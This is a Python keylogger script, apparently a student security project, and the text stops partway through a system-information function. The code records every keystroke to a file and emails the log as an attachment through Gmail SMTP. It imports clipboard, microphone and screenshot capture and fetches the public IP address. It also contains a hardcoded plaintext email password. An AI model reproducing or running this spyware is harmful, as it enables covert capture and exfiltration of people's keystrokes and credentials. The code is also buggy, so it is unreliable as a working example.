from __future__ import with_statement
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from fileinput import filename
from ipaddress import ip_address
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sdl

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import  Process,freeze_support
from PIL import ImageGrab

email_address="keiterjoel2@gmail.com"
password="GodisGreat77."
email_to="keiterjoel2@gmail.com"

# Create Key log file
key_info="keys_log.txt"
system_info="systeminfo.txt"

# File path of Key log file
file_path="D:\Docs\Computing Fundamentals\Python Work\Cybersecurity Projects\Keylogger"
# Important to access Key log file
extend="\\"

counter=0
# List for storing keys
keys=[]

def on_press(key):
    global keys,counter
    print(key)
    keys.append(key)
    counter+=1
    
    if counter >= 1:
        counter = 0
        write_to_file(keys)
        keys=[]
      
    
def write_to_file(keys):
    # Open file and append keys pressed
    with open(file_path + extend + key_info,"a") as f:
        for key in keys:
            r=str(key).replace("'", "")
            if r.find("space")>0:
              f.write('\n')
              f.close()
            elif r.find("Key")== -1:
                f.write(r)
                f.close()
                
            
              
def on_release(key):
    if key==Key.esc:
      return False
  
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
   
        
# Email Functionality - send keys to email
    
def send_email(file_name, attachment,email_to):
    email_from=email_address
    
    msg=MIMEMultipart()#for attachments
    
    msg['From']=email_from
    msg['To']=email_to
    msg['Subject']="Important Log"
    
    body="Logs_so_far"# email body
    msg.attach(MIMEText(body,'plain')) 
    
    file_name=file_name
    attachment=open(attachment,'rb')
    
    p=MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    
    encoders.encode_base64(p)
    
    p.add_header('Contet-Disposition',"attachment; filename=%s" % filename)
    msg.attach(p)
    
    smtp_session=smtplib.SMTP('smtp.gmail.com',587) 
    
    smtp_session.starttls()
    
    smtp_session.login(email_from,password)
    
    text=msg.as_string()
    
    smtp_session.sendmail(email_from,email_to, text)
    
 
send_email(key_info, file_path + extend + key_info, email_to)


def system_informaation():
    with open(file_path, + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
          public_ip = get("https://api.ipify.org").text 
          f.write("Public IP Address: " + public_ip)
        except Exception:
          f.write("Failed to get public IP address!")
          
        f.write("Processor: ")
